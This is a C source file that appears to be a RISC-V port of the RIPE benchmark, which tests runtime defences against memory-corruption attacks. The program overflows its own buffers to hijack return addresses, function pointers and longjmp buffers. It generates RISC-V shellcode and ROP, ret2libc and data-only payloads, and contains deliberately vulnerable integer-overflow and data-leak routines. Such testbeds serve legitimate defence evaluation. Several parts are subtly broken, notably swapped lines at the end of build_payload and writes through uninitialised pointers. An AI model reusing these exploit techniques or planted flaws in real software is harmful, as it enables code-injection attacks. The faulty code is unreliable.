/*
 * Standalone RISC-V compatible implementation of RIPE
 *
 * Attack params:
 * --------------
 * technique = direct, indirect
 * inject parameter = ret2libc, shellcode injection, ROP, data only
 * code pointer = return address, function pointer, vulnerable struct, longjmp buffer,
 *         non-control data variable
 * location = stack, heap, data, bss
 * function = memcpy, strcpy, strncpy, strcat, strncat, sprintf, snprintf,
 *         sscanf, homebrew memcpy
 */

#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <setjmp.h>
#include <inttypes.h>

#include "ripe_attack_generator.h"

#define print_reason(s) // fprintf(stderr, s)

// shellcode is generated in perform_attack()
static uint8_t shellcode_nonop[12];

#ifndef RIPE_DEF_TECHNIQUE
    #define RIPE_DEF_TECHNIQUE DIRECT
#endif
#ifndef RIPE_DEF_INJECT
    #define RIPE_DEF_INJECT RETURN_ORIENTED_PROGRAMMING
#endif
#ifndef RIPE_DEF_CODE_PTR
    #define RIPE_DEF_CODE_PTR RET_ADDR
#endif
#ifndef RIPE_DEF_LOCATION
    #define RIPE_DEF_LOCATION STACK
#endif
#ifndef RIPE_DEF_FUNCTION
    #define RIPE_DEF_FUNCTION MEMCPY
#endif

// For RETURN_ORIENTED_PROGRAMMING we skip over the prologue code of
// rop_target() to simulate return-oriented programming gadget
#ifdef __riscv_compressed
  #define PROLOGUE_LENGTH 8
#else
  #define PROLOGUE_LENGTH 16
#endif

#define SECRET_STRING_START "Secret data "
#define MAX_SECRET_LEN (32)

static void attack_once(void);
static int attack_wrapper(void);
static int perform_attack(func_t **stack_func_ptr_param,
                          jmp_buf *stack_jmp_buffer_param);
static void dummy_function(void);
static const char *hex_to_bin(char c);
static void hex_to_string(char * str, size_t val);
static void format_instruction(uint8_t *dest, size_t insn);

/* To keep mandatory control variables out of harm, we need to make sure their
 * addresses are safe, i.e. are not between overflown buffers and their targets.
 * This is only possible in C by stuffing everything in structs... */
static struct {
    bool output_debug_info;
    struct attack_form attack;
    struct payload payload;
} g = {
    .output_debug_info = true,
};
jmp_buf control_jmp_buffer; // We use long jmp to get back from attacks.

static struct {
    uint32_t dop_dest; // FIXME: make this global?
    /* DATA SEGMENT TARGETS
        Vulnerable struct
        FIXME: sdata is not a thing - unless we can exploit it on some platform productively.
        Overflow buffers (buffer1 for .data, buffer2 for .sdata)
        Arbitrary read data
        DOP flag
        Two general pointers for indirect attack
        Function pointer
        Longjmp buffer
    */
    struct attackme data_struct;
    uint8_t data_buffer1[256];
    uint8_t data_buffer2[8];
    char data_secret[MAX_SECRET_LEN];
    uint32_t data_flag;
    uint8_t * data_mem_ptr_aux[256];
    uint8_t * data_mem_ptr[256];
    func_t * data_func_ptr;
    jmp_buf data_jmp_buffer;
} d;

static void
init_d(void)
{
    d.dop_dest = 0xdeadc0de; // data-only target pointer

    d.data_struct = (struct attackme){ "AAAA", &dummy_function };
    strcpy((char *)d.data_buffer1, "d");
    strcpy((char *)d.data_buffer2, "dummy");
    strcpy((char *)d.data_secret, SECRET_STRING_START "DATA");
    d.data_flag = 0;
    *(uintptr_t *) d.data_mem_ptr_aux = (uintptr_t) &dummy_function;
    *(uintptr_t *) d.data_mem_ptr = (uintptr_t) &dummy_function;
    d.data_func_ptr = &dummy_function;
}

/* BSS TARGETS
    Vulnerable Struct
    Overflow buffer
    Arbitrary read data
    DOP flag
    Two general pointers for indirect attack
    Function pointer
    Longjmp buffer
*/
struct bss {
    struct attackme bss_struct;
    uint8_t bss_buffer[256];
    char bss_secret[MAX_SECRET_LEN];
    uint32_t bss_flag;
    uint8_t * bss_mem_ptr_aux;
    uint8_t * bss_mem_ptr;
    func_t * bss_func_ptr;
    jmp_buf bss_jmp_buffer;
};

static void
init_bss(struct bss *b)
{
    b->bss_struct = (struct attackme){ "AAAA", &dummy_function };
    b->bss_buffer[0] = '\0';
    strcpy(b->bss_secret, SECRET_STRING_START "BSS");
    b->bss_flag = 0;
    *(uintptr_t *) b->bss_mem_ptr_aux = (uintptr_t) &dummy_function;
    *(uintptr_t *) b->bss_mem_ptr = (uintptr_t) &dummy_function;
    b->bss_func_ptr = &dummy_function;
}

/* HEAP TARGETS
    Vulnerable struct
    Overflow buffers
    DOP flag
    Two general pointers for indirect attack
    Arbitrary read data
    Function pointer array
    Longjmp buffer
*/
struct heap_targets {
    struct attackme * heap_struct;

    // FIXME: "slightly" outdated. 3 buffers and no function pointer array
    /* Two buffers declared to be able to chose buffer that gets allocated    */
    /* first on the heap. The other buffer will be set as a target, i.e. a    */
    /* heap array of function pointers.                                       */
    uint8_t * heap_buffer1;
    uint8_t * heap_buffer2;
    uint8_t * heap_buffer3;

    uint32_t * heap_flag;
    uint8_t * heap_mem_ptr_aux;
    uint8_t * heap_mem_ptr;
    char * heap_secret;
    func_t ** heap_func_ptr_ptr;
    jmp_buf * heap_jmp_buffer;
};

static const char * const bin4b[16] = {"0000", "0001", "0010", "0011",
                                       "0100", "0101", "0110", "0111",
                                       "1000", "1001", "1010", "1011",
                                       "1100", "1101", "1110", "1111"};

// Do not count for the null terminator since a null in the shellcode will
// terminate any string function in the standard library
static size_t size_shellcode_nonop = sizeof(shellcode_nonop);

// control data destinations
void
shellcode_target(void);
void
ret2libc_target(void);
void
rop_target(void);
void
dop_target(uint8_t * buf, uint32_t auth);

// integer overflow vulnerability
void
iof(uint8_t * buf, uint32_t iv);

// arbitrary read bug
void
data_leak(uint8_t *buf);

// forces length param to register and jumps before return for stack param attacks
void
homebrew_memcpy_param(void * dst, const void * src, register size_t length);

// longjmp() is called from here
void
lj_func(jmp_buf lj_buf);

// get ret address
// ra written to stack one word higher than bp
#define OLD_BP_PTR   __builtin_frame_address(0)
#define RET_ADDR_PTR ((uintptr_t *) OLD_BP_PTR - 1)


int
main(int argc, char ** argv)
{
    // Set defaults
    g.attack.technique = RIPE_DEF_TECHNIQUE;
    g.attack.inject_param = RIPE_DEF_INJECT;
    g.attack.code_ptr = RIPE_DEF_CODE_PTR;
    g.attack.location = RIPE_DEF_LOCATION;
    g.attack.function = RIPE_DEF_FUNCTION;

#ifndef RIPE_NO_CLI
    if (parse_ripe_params(argc, argv, &g.attack, &g.output_debug_info) != 0) {
        fprintf(stderr, "Could not parse command line arguments\n");
        return 1;
    }
#endif
    attack_once();
    return 0;
} /* main */



static void
attack_once(void) {
    if (is_attack_possible()) {
        int ret = attack_wrapper();
        fprintf(stderr, "attack_wrapper() returned %d\n", ret);
        }
}

__attribute__ ((noinline)) // Make sure this function has its own stack frame
static int
attack_wrapper(void) {
    jmp_buf stack_jmp_buffer_param;
    func_t *stack_func_ptr_param = dummy_function;
    return perform_attack(&stack_func_ptr_param, &stack_jmp_buffer_param);
}

/********************/
/* PERFORM_ATTACK() */
/********************/
static int
perform_attack(
    func_t ** stack_func_ptr_param,
    jmp_buf *stack_jmp_buffer_param)
{
    /* STACK TARGETS
        Function Pointer
        Two general pointers for indirect attack
        DOP flag
        Arbitrary read data
        Overflow buffer
        Vulnerable struct
        Long jump buffer
    */
    struct {
        struct attackme stack_struct;
        uint8_t stack_buffer[1024];
        char stack_secret[MAX_SECRET_LEN];
        uint32_t stack_flag;
        uint8_t * stack_mem_ptr_aux;
        uint8_t * stack_mem_ptr;
        func_t * stack_func_ptr;
        jmp_buf stack_jmp_buffer;
    } stack;
    strcpy(stack.stack_secret, SECRET_STRING_START "STACK");
    stack.stack_struct.func_ptr = &dummy_function;
    stack.stack_func_ptr = &dummy_function;
    stack.stack_flag = 0;

    struct heap_targets * heap = malloc(sizeof(struct heap_targets));
    if (heap == NULL) {
        fprintf(stderr, "malloc()ing heap_targets failed!\n");
        exit(1);
    }
    memset(heap, 0, sizeof(struct heap_targets));

    heap->heap_struct = malloc(sizeof(*heap->heap_struct));
    heap->heap_buffer1 = malloc(256 + sizeof(long));
    heap->heap_buffer2 = malloc(256 + sizeof(long));
    heap->heap_buffer3 = malloc(256 + sizeof(long));
    heap->heap_flag = malloc(sizeof(int *));
    if (heap->heap_struct == NULL ||
        heap->heap_buffer1 == NULL ||
        heap->heap_buffer2 == NULL ||
        heap->heap_buffer3 == NULL ||
        heap->heap_flag == NULL) {
        fprintf(stderr, "A heap malloc() failed!\n");
        exit(1);
    }
    heap->heap_struct->func_ptr = &dummy_function;
    heap->heap_func_ptr_ptr = NULL;
    heap->heap_flag = 0;

    static struct bss b;
    init_bss(&b);

    /* Pointer to buffer to overflow */
    uint8_t * buffer;
    /* Address to target for direct (part of) overflow */
    void * target_addr;
    /* Address for second overflow (indirect ret2libc attack) */
    void * target_addr_aux;

    // write shellcode with correct jump address
    build_shellcode(shellcode_nonop);

    switch (g.attack.location) {
        case STACK:
            // Special case for stack_struct
            if (g.attack.code_ptr == STRUCT_FUNC_PTR_STACK &&
              g.attack.technique == DIRECT)
            {
                buffer = stack.stack_struct.buffer;
            } else {
                buffer = stack.stack_buffer;
            }

            // set up stack ptr with DOP target
            if (g.attack.inject_param == DATA_ONLY) {
                stack.stack_mem_ptr = (uint8_t *)&stack.stack_flag;
            }

            // Also set the location of the function pointer and the
            // longjmp buffer on the heap (the same since only choose one)
            heap->heap_func_ptr_ptr   = (func_t **)(uintptr_t)heap->heap_buffer1;
            heap->heap_jmp_buffer = (jmp_buf *)heap->heap_buffer1;
            break;
        case HEAP:
            /* Injection into heap buffer                            */

            // Special case for heap_struct
            if (g.attack.code_ptr == STRUCT_FUNC_PTR_HEAP &&
              g.attack.technique == DIRECT)
            {
                buffer = heap->heap_struct->buffer;
                break;
            }

            if (((uintptr_t) heap->heap_buffer1 < (uintptr_t) heap->heap_buffer2) &&
              ((uintptr_t) heap->heap_buffer2 < (uintptr_t) heap->heap_buffer3))
            {
                buffer = heap->heap_buffer1;
                // Set the location of the memory pointer on the heap
                heap->heap_mem_ptr     = heap->heap_buffer2;
                heap->heap_mem_ptr_aux = heap->heap_buffer3;

                if (g.attack.code_ptr == VAR_LEAK) {
                    heap->heap_secret = (char *)heap->heap_buffer2;
                    strcpy(heap->heap_secret, SECRET_STRING_START "HEAP");
                }
                // Also set the location of the function pointer and the
                // longjmp buffer on the heap (the same since only choose one)
                heap->heap_func_ptr_ptr = (func_t **)(uintptr_t)heap->heap_buffer3;

                // allocate the jump buffer
                heap->heap_jmp_buffer = (jmp_buf *)heap->heap_buffer3;
            } else {
                if (g.output_debug_info) {
                    fprintf(stderr,
                      "Error: Heap buffers allocated in the wrong order.\n");
                }

                exit(1);
            }

            // set up heap ptr with DOP target
            if (g.attack.inject_param == DATA_ONLY) {
                heap->heap_mem_ptr = (uint8_t *)heap->heap_flag;
            }
            break;
        case DATA:
            /* Injection into data segment buffer                    */

            // Special case for stack_struct
            if (g.attack.code_ptr == STRUCT_FUNC_PTR_DATA) {
                buffer = d.data_struct.buffer;
                break;
            }

            if ((g.attack.code_ptr == FUNC_PTR_DATA ||
              g.attack.code_ptr == VAR_BOF) &&
              g.attack.technique == DIRECT)
            {
                buffer = d.data_buffer2;
            } else {
                buffer = d.data_buffer1;
            }

            // set up data ptr with DOP target
            if (g.attack.inject_param == DATA_ONLY) {
                *d.data_mem_ptr = (uint8_t *)&d.data_flag;
            }
            // Also set the location of the function pointer and the
            // longjmp buffer on the heap (the same since only choose one)
            heap->heap_jmp_buffer = (jmp_buf *)heap->heap_buffer1;
            break;
        case BSS:
            /* Injection into BSS buffer                             */

            // Special case for bss_struct
            if (g.attack.code_ptr == STRUCT_FUNC_PTR_BSS) {
                buffer = b.bss_struct.buffer;
                break;
            }

            buffer = b.bss_buffer;

            b.bss_mem_ptr_aux = (uint8_t*)(uintptr_t)&dummy_function;
            b.bss_mem_ptr     = (uint8_t*)(uintptr_t)&dummy_function;

            // set up bss ptr with DOP target
            if (g.attack.inject_param == DATA_ONLY) {
                b.bss_mem_ptr = (uint8_t *)&b.bss_flag;
            }
            // Also set the location of the function pointer on the heap
            break;
    }

    // make sure we actually have an initialized function pointer on the heap
    if (heap->heap_func_ptr_ptr != NULL)
        *heap->heap_func_ptr_ptr = &dummy_function;

    // Set Target Address
    switch (g.attack.technique) {
        case DIRECT:
            switch (g.attack.code_ptr) {
                case RET_ADDR:
                    target_addr = RET_ADDR_PTR;
                    break;
                case FUNC_PTR_STACK_VAR:
                    target_addr = &stack.stack_func_ptr;
                    break;
                case FUNC_PTR_STACK_PARAM:
                    target_addr = stack_func_ptr_param;
                    break;
                case FUNC_PTR_HEAP:
                    target_addr = heap->heap_func_ptr_ptr;
                    break;
                case FUNC_PTR_BSS:
                    target_addr = &b.bss_func_ptr;
                    break;
                case FUNC_PTR_DATA:
                    target_addr = &d.data_func_ptr;
                    break;
                case LONGJMP_BUF_STACK_VAR:
                    target_addr = stack.stack_jmp_buffer;
                    break;
                case LONGJMP_BUF_STACK_PARAM:
                    target_addr = stack_jmp_buffer_param;
                    break;
                case LONGJMP_BUF_HEAP:
                    target_addr = heap->heap_jmp_buffer;
                    break;
                case LONGJMP_BUF_DATA:
                    target_addr = d.data_jmp_buffer;
                    break;
                case LONGJMP_BUF_BSS:
                    target_addr = b.bss_jmp_buffer;
                    break;
                case STRUCT_FUNC_PTR_STACK:
                    target_addr = &stack.stack_struct.func_ptr;
                    break;
                case STRUCT_FUNC_PTR_HEAP:
                    target_addr = &heap->heap_struct->func_ptr;
                    break;
                case STRUCT_FUNC_PTR_DATA:
                    target_addr = &d.data_struct.func_ptr;
                    break;
                case STRUCT_FUNC_PTR_BSS:
                    target_addr = &b.bss_struct.func_ptr;
                    break;
                case VAR_BOF:
                // if data-only, location determines target
                case VAR_IOF:
                    switch (g.attack.location) {
                        case STACK:
                            target_addr = &stack.stack_flag;
                            break;
                        case HEAP:
                            target_addr = heap->heap_flag;
                            break;
                        case DATA:
                            target_addr = &d.data_flag;
                            break;
                        case BSS:
                            target_addr = &b.bss_flag;
                            break;
                    }
                    break;
                case VAR_LEAK:
                    switch (g.attack.location) {
                        case STACK:
                            target_addr = &stack.stack_secret;
                            break;
                        case HEAP:
                            target_addr = heap->heap_secret;
                            break;
                        case DATA:
                            target_addr = &d.data_secret;
                            break;
                        case BSS:
                            target_addr = &b.bss_secret;
                            break;
                    }
                    break;
            }
            break;

        case INDIRECT:
            switch (g.attack.location) {
                case STACK:
                    target_addr     = &stack.stack_mem_ptr;
                    target_addr_aux = &stack.stack_mem_ptr_aux;
                    break;
                case HEAP:
                    target_addr     = heap->heap_mem_ptr;
                    target_addr_aux = heap->heap_mem_ptr_aux;
                    break;
                case DATA:
                    target_addr     = &d.data_mem_ptr;
                    target_addr_aux = &d.data_mem_ptr_aux;
                    break;
                case BSS:
                    target_addr     = &b.bss_mem_ptr;
                    target_addr_aux = &b.bss_mem_ptr_aux;
                    break;
            }
            break;
    }

    // set longjmp buffers
    switch (g.attack.code_ptr) {
        case LONGJMP_BUF_STACK_VAR:
            if (setjmp(stack.stack_jmp_buffer) != 0) {
                /* setjmp() returns 0 if returning directly and non-zero when returning */
                /* from longjmp() using the saved context. Attack failed.               */
                printf("Longjmp attack failed. Returning normally...\n");
                return 1;
            }
            break;
        case LONGJMP_BUF_STACK_PARAM:
            if (setjmp(*stack_jmp_buffer_param) != 0) {
                printf("Longjmp attack failed. Returning normally...\n");
                return 1;
            }
            break;
        case LONGJMP_BUF_HEAP:
            if (setjmp(*heap->heap_jmp_buffer) != 0) {
                printf("Longjmp attack failed. Returning normally...\n");
                return 1;
            }
            break;
        case LONGJMP_BUF_DATA:
            if (setjmp(d.data_jmp_buffer) != 0) {
                printf("Longjmp attack failed. Returning normally...\n");
                return 1;
            }
            break;
        case LONGJMP_BUF_BSS:
            if (setjmp(b.bss_jmp_buffer) != 0) {
                printf("Longjmp attack failed. Returning normally...\n");
                return 1;
            }
            break;
        default:
            break;
    }

    switch (g.attack.technique) {
        case DIRECT:
            switch (g.attack.inject_param) {
                case RETURN_INTO_LIBC:
                    // simulate ret2libc by invoking mock libc function
                    g.payload.overflow_ptr = (void *)(uintptr_t)&ret2libc_target;
                    break;
                case RETURN_ORIENTED_PROGRAMMING:
                    g.payload.overflow_ptr = (void *)((uintptr_t)&rop_target + PROLOGUE_LENGTH);
                    break;
                case INJECTED_CODE_NO_NOP:
                    g.payload.overflow_ptr = buffer;
                    break;
                case DATA_ONLY:
                    // corrupt variable with nonzero value
                    g.payload.overflow_ptr = (void *)0xdeadc0de;
                    break;
                default:
                    if (g.output_debug_info) {
                        fprintf(stderr, "Unknown choice of attack code");
                        exit(1);
                    }
            }
            break;
        case INDIRECT:
            /* Here payload.overflow_ptr will point to the final pointer target   */
            /* since an indirect attack first overflows a general pointer that in */
            /* turn is dereferenced to overwrite the target pointer               */
            switch (g.attack.code_ptr) {
                case RET_ADDR:
                    g.payload.overflow_ptr = RET_ADDR_PTR;
                    break;
                case FUNC_PTR_STACK_VAR:
                    g.payload.overflow_ptr = &stack.stack_func_ptr;
                    break;
                case FUNC_PTR_STACK_PARAM:
                    g.payload.overflow_ptr = stack_func_ptr_param;
                    break;
                case FUNC_PTR_HEAP:
                    g.payload.overflow_ptr = (void *)(uintptr_t)heap->heap_func_ptr_ptr;
                    break;
                case FUNC_PTR_BSS:
                    g.payload.overflow_ptr = &b.bss_func_ptr;
                    break;
                case FUNC_PTR_DATA:
                    g.payload.overflow_ptr = &d.data_func_ptr;
                    break;
                case STRUCT_FUNC_PTR_STACK:
                    g.payload.overflow_ptr = &stack.stack_struct.func_ptr;
                    break;
                case STRUCT_FUNC_PTR_HEAP:
                    g.payload.overflow_ptr = &heap->heap_struct->func_ptr;
                    break;
                case STRUCT_FUNC_PTR_DATA:
                    g.payload.overflow_ptr = &d.data_struct.func_ptr;
                    break;
                case STRUCT_FUNC_PTR_BSS:
                    g.payload.overflow_ptr = &b.bss_struct.func_ptr;
                    break;
                case LONGJMP_BUF_STACK_VAR:
                    g.payload.overflow_ptr = stack.stack_jmp_buffer;
                    break;
                case LONGJMP_BUF_STACK_PARAM:
                    g.payload.overflow_ptr = stack_jmp_buffer_param;
                    break;
                case LONGJMP_BUF_HEAP:
                    g.payload.overflow_ptr = *heap->heap_jmp_buffer;
                    break;
                case LONGJMP_BUF_DATA:
                    g.payload.overflow_ptr = d.data_jmp_buffer;
                    break;
                case LONGJMP_BUF_BSS:
                    g.payload.overflow_ptr = b.bss_jmp_buffer;
                    break;
                // indirect attacks don't apply to int overflows or leaks
                case VAR_BOF:
                case VAR_IOF:
                case VAR_LEAK:
                    g.payload.overflow_ptr = &d.dop_dest;
                    break;
                default:
                    if (g.output_debug_info) {
                        fprintf(stderr,
                          "Error: Unknown choice of code pointer\n");
                    }

                    exit(1);
                    break;
            }
            break;
    }

    if (g.output_debug_info) {
        fprintf(stderr, "target_addr == %p\n", target_addr);
        fprintf(stderr, "buffer == %p\n", buffer);
    }

    // ------------------------------------------------------
    /* Calculate payload size for overflow of chosen target address */
    if ((uintptr_t) target_addr > (uintptr_t) buffer) {
        g.payload.size =
          (unsigned int) ((unsigned long) target_addr + sizeof(long)
          - (unsigned long) buffer
          + 1); /* For null termination so that buffer can be     */
                /* used with string functions in standard library */

        if (g.output_debug_info)
            fprintf(stderr, "payload size == %zd\n", g.payload.size);
    } else {
        if (g.output_debug_info)
            fprintf(stderr, "Error calculating size of payload\n");
        exit(1);
    }

    /* Set first byte of buffer to null to allow concatenation functions to */
    /* start filling the buffer from that first byte                        */
    buffer[0] = '\0';

    if (!build_payload(&g.payload)) {
        if (g.output_debug_info)
            fprintf(stderr, "Error: Could not build payload\n");
        exit(1);
    }

    /****************************************/
    /* Overflow buffer with chosen function */
    /* Note: Here memory will be corrupted  */
    /****************************************/

    switch (g.attack.function) {
        case MEMCPY:
            // memcpy() shouldn't copy the terminating NULL, therefore - 1
            memcpy(buffer, g.payload.buffer, g.payload.size - 1);
            break;
        case STRCPY:
            strcpy((char *)buffer, g.payload.buffer);
            break;
        case STRNCPY:
            strncpy((char *)buffer, g.payload.buffer, g.payload.size);
            break;
        case SPRINTF:
             sprintf((char *)buffer, "%s", g.payload.buffer);
            break;
        case SNPRINTF:
            snprintf((char *)buffer, g.payload.size, "%s", g.payload.buffer);
            break;
        case STRCAT:
            strcat((char *)buffer, g.payload.buffer);
            break;
        case STRNCAT:
            strncat((char *)buffer, g.payload.buffer, g.payload.size);
            break;
        case SSCANF: {
            char fmt[16];
            snprintf(fmt, sizeof(fmt)-1, "%%%ic", g.payload.size);
            sscanf(g.payload.buffer, fmt, buffer);
            break;
        }
        case HOMEBREW:
            homebrew_memcpy(buffer, g.payload.buffer, g.payload.size - 1);
            break;
        default:
            if (g.output_debug_info)
                fprintf(stderr, "Error: Unknown choice of function\n");
            exit(1);
            break;
    }

    /*******************************************/
    /* Ensure that code pointer is overwritten */
    /*******************************************/

    switch (g.attack.technique) {
        case DIRECT:
            /* Code pointer already overwritten */
            break;
        case INDIRECT:
            // zero out junk byte written to general pointer
            if (g.attack.function == SSCANF) {
                *(uint32_t *) target_addr <<= 8;
                *(uint32_t *) target_addr >>= 8;
            }

            if (g.attack.inject_param == RETURN_INTO_LIBC) {
                // auxilliary overflow to give attacker control of a second general ptr
                g.payload.overflow_ptr = (void *)(uintptr_t)&ret2libc_target;
                g.payload.size         = (uintptr_t) target_addr_aux
                  - (uintptr_t) buffer + sizeof(long) + 1;
                build_payload(&g.payload);
                memcpy(buffer, g.payload.buffer, g.payload.size - 1);
                printf("target_addr_aux: %p\n", target_addr_aux);

                switch (g.attack.location) {
                    case STACK:
                        *(uint32_t *) (*(uint32_t *) target_addr) =
                          (uintptr_t) stack.stack_mem_ptr_aux;
                        break;
                    case HEAP:
                        *(uint32_t *) (*(uint32_t *) target_addr) =
                          (uintptr_t) *heap->heap_mem_ptr_aux;
                        break;
                    case DATA:
                        *(uint32_t *) (*(uint32_t *) target_addr) =
                          (uintptr_t) *d.data_mem_ptr_aux;
                        break;
                    case BSS:
                        *(uint32_t *) (*(uint32_t *) target_addr) =
                          (uintptr_t) b.bss_mem_ptr_aux;
                        break;
                }
            } else if (g.attack.inject_param == INJECTED_CODE_NO_NOP) {
                *(uintptr_t *) (*(uintptr_t *) target_addr) =
                  (uintptr_t) buffer;
            }
            break;
        default:
            if (g.output_debug_info)
                fprintf(stderr, "Error: Unknown choice of attack parameterB\n");

            exit(1);
            break;
    }

    printf("");
    printf("\nExecuting attack... ");

    switch (g.attack.code_ptr) {
        case RET_ADDR:
            break;
        case FUNC_PTR_STACK_VAR:
            stack.stack_func_ptr();
            break;
        case FUNC_PTR_STACK_PARAM:
            (**stack_func_ptr_param)();
            break;
        case FUNC_PTR_HEAP:
            (*heap->heap_func_ptr_ptr)();
            break;
        case FUNC_PTR_BSS:
            (*b.bss_func_ptr)();
            break;
        case FUNC_PTR_DATA:
            (*d.data_func_ptr)();
            break;
        case LONGJMP_BUF_STACK_VAR:
            lj_func(stack.stack_jmp_buffer);
            break;
        case LONGJMP_BUF_STACK_PARAM:
            lj_func(*stack_jmp_buffer_param);
            break;
        case LONGJMP_BUF_HEAP:
            lj_func(*heap->heap_jmp_buffer);
            break;
        case LONGJMP_BUF_DATA:
            lj_func(d.data_jmp_buffer);
            break;
        case LONGJMP_BUF_BSS:
            lj_func(b.bss_jmp_buffer);
            break;
        case STRUCT_FUNC_PTR_STACK:
            (*stack.stack_struct.func_ptr)();
            break;
        case STRUCT_FUNC_PTR_HEAP:
            (*heap->heap_struct->func_ptr)();
            break;
        case STRUCT_FUNC_PTR_DATA:
            (*d.data_struct.func_ptr)();
            break;
        case STRUCT_FUNC_PTR_BSS:
            (*b.bss_struct.func_ptr)();
            break;
        case VAR_BOF:
        case VAR_IOF:
            switch (g.attack.location) {
                case STACK:
                    dop_target(buffer, *stack.stack_mem_ptr);
                    break;
                case HEAP:
                    dop_target(buffer, *heap->heap_mem_ptr);
                    break;
                case DATA:
                    dop_target(buffer, **d.data_mem_ptr);
                    break;
                case BSS:
                    dop_target(buffer, *b.bss_mem_ptr);
                    break;
            }
            break;
        case VAR_LEAK:
            data_leak(buffer);
            break;
    }
    return 1;
} /* perform_attack */

/*******************/
/* BUILD_PAYLOAD() */
/*******************/
bool
build_payload(struct payload * payload)
{
    size_t size_shellcode, bytes_to_pad;
    char * shellcode, * temp_char_buffer, * temp_char_ptr;
    
    switch (g.attack.inject_param) {
        case INJECTED_CODE_NO_NOP:
            if (payload->size < (size_shellcode_nonop + sizeof(func_t*))) {
                return false;
            }
            shellcode      = shellcode_nonop;
            size_shellcode = size_shellcode_nonop;
            break;
        case DATA_ONLY:
            // 256 padding bytes for unsigned 8bit IOF
            if (g.attack.code_ptr == VAR_IOF)
                payload->size = 256 + sizeof(long) + sizeof(char);
            
            if (g.attack.code_ptr == VAR_LEAK) {
                // simulated packet with length included
                payload->size += 32 - sizeof(long);
                payload->buffer[0] = payload->size & 0xFF;
                payload->buffer[1] = payload->size / 0x100;
                payload->buffer[2] = 'A';
                payload->buffer[3] = '\0';
                payload->size = 4;
                return true;
            } /* else fall through */
        case RETURN_ORIENTED_PROGRAMMING:
        case RETURN_INTO_LIBC:
            if (payload->size < sizeof(long))
                return false;

            size_shellcode = 0;
            shellcode      = "dummy";
            break;
    }
    /* Allocate payload buffer */
    payload->buffer = malloc(payload->size);

    /* Copy shellcode into payload buffer */
    memcpy(payload->buffer, shellcode, size_shellcode);

    /* Calculate number of bytes to pad with */
    /* size - shellcode - target address - null terminator */
    bytes_to_pad =
      (payload->size - size_shellcode - sizeof(void *) - sizeof(char));

    /* Pad payload buffer with dummy bytes */
    memset((payload->buffer + size_shellcode), 'A', bytes_to_pad);

    if (g.output_debug_info) {
        fprintf(stderr, "bytes to pad: %zd\n", bytes_to_pad);
        fprintf(stderr, "\noverflow_ptr: %p\n", payload->overflow_ptr);
    }

    /* Add the address to the direct or indirect target */
    if (g.attack.code_ptr != VAR_IOF) {
        memcpy(&(payload->buffer[size_shellcode + bytes_to_pad]),
          &payload->overflow_ptr,
          sizeof(void *));
    }

    /* Finally, add the terminating null character at the end */
    memset((payload->buffer + payload->size - 1), '\0', 1);
    
        fprintf(stderr, "payload: %s\n", payload->buffer);
    if (g.output_debug_info)
    return true;

} /* build_payload */

static void
dummy_function(void) {
    printf("Dummy function\n");
}

// call longjmp on a buffer in perform_attack()
void
lj_func(jmp_buf lj_buf)
{
    longjmp(lj_buf, 1111);
}

void
homebrew_memcpy(void * dst, const void * src, size_t length)
{
    char * d, * s;

    d = (char *) dst;
    s = (char *) src;

    while (length--) {
        *d++ = *s++;
    }
}

void
shellcode_target()
{
    printf("success.\nCode injection function reached.\n");
    exit(0);
}

void
ret2libc_target()
{
    printf("success.\nRet2Libc function reached.\n");
    exit(0);
}

void
dop_target(uint8_t * buf, uint32_t auth)
{
    size_t auth_loc = auth;

    if (g.attack.code_ptr == VAR_IOF) {
        iof(buf, (uintptr_t)&auth_loc);
    }

    if (!auth_loc) {
        printf("DOP attack failed\n");
    } else {
        printf("success.\nDOP memory corruption reached.\n");
        exit(0);
    }
}

__attribute__ ((optimize (0))) // Make sure prologue length does not change
void
rop_target(void)
{
    printf("success.\nROP function reached.\n");
    exit(0);
}

void
iof(uint8_t * buf, uint32_t iv)
{
    char * map;
    uint32_t key = iv;
    size_t len  = strlen((char *)buf);

    // 0-length allocation and vulenrable hash operations
    map      = malloc(len * sizeof(uint8_t));
    key     -= (uintptr_t) map;
    key     &= (uint16_t) len - 1;
    map[key] = 0xa1;
}

void
data_leak(uint8_t *buf) {
    uint16_t size = buf[0] + (buf[1] * 0x100), i;
    uint8_t *msg = malloc(size);

    memcpy(msg, buf + 2, size);
    for (i = 0; i < size; i++) {
        if (msg[i] >= 0x20) putc(msg[i],stdout);
    }

    putc('\n', stdout);
}           

/*********************/
/* BUILD_SHELLCODE() */
/*********************/
void
build_shellcode(uint8_t * shellcode)
{
    char attack_addr[9], low_bits[4], high_bits[6];  // target address and its components
    // fix shellcode when lower bits would become negative
    if (((uintptr_t)&shellcode_target & 0x00000fff) >= 0x800)
        hex_to_string(attack_addr, (uintptr_t)&shellcode_target + 0x1000);
    else
        hex_to_string(attack_addr, (uintptr_t)&shellcode_target);

    // split attack address into low and high bit strings
    strncpy(low_bits, &attack_addr[5], 3);
    low_bits[3] = '\0'; // unnecessary (unlike below)
    strncpy(high_bits, attack_addr, 5);
    high_bits[5] = '\0';

    char lui_bin[33], addi_bin[33]; // binary insn encodings (as strings)
    lui_bin[0] = '\0';
    addi_bin[0] = '\0';

    // generate 20 imm bits for the LUI insn
    for (int i = 0; i < 5; i++) {
        strncat(lui_bin, hex_to_bin(high_bits[i]), 4);
    }

    uint32_t lui_val, addi_val, jalr_val = 0x000300e7; // raw binary insn encodings
    // append reg and opcode bits, then convert to raw binary
    strncat(lui_bin, "001100110111", 12);
    lui_val = strtoul(lui_bin, 0, 2);

    // generate binary for ADDI insn
    for (int i = 0; i < 3; i++) {
        strncat(addi_bin, hex_to_bin(low_bits[i]), 4);
    }

    strncat(addi_bin, "00110000001100010011", 20);
    addi_val = strtoul(addi_bin, 0, 2);

    format_instruction(shellcode, lui_val);
    format_instruction(shellcode + 4, addi_val);
    format_instruction(shellcode + 8, jalr_val);

    char lui_s[9], addi_s[9]; // hex insn encodings
    hex_to_string(lui_s, lui_val);
    lui_s[8] = '\0';
    hex_to_string(addi_s, addi_val);
    addi_s[8] = '\0';

    if (g.output_debug_info) {
        printf("----------------\nShellcode instructions:\n");
        printf("%s0x%-20s%14s\n", "lui t1,  ", high_bits, lui_s);
        printf("%s0x%-20s%10s\n", "addi t1, t1, ", low_bits, addi_s);
        printf("%s%30s%08"PRIx32"\n", "jalr t1", " ", jalr_val);
    }
} /* build_shellcode */

static const char *
hex_to_bin(char c) {
    if (c >= '0' && c <= '9')
        return bin4b[c - '0'];
    if (c >= 'a' && c <= 'f')
        return bin4b[10 + c - 'a'];
    return NULL;
}

